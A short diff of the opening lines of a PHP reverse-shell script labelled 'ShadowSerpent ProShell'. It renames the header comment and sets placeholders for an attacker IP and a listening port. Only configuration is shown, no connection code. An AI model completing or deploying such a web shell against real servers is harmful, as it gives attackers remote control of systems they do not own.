@@ -1,6 +1,6 @@
 <?php
 // ⚠️ EDUCATIONAL USE ONLY – Authorized environments only!
-// 🐉 Kali GPT – ShadowSerpent ProShell++ Reverse Shell
+// 🐍– ShadowSerpent ProShell Reverse Shell
 
 $ip = 'YOUR.IP.ADDR.HERE';   // 🔧 CHANGE THIS TO YOUR ATTACKER IP
 $port = 4555;                 // ✅  Add any port like 4455 ,6667
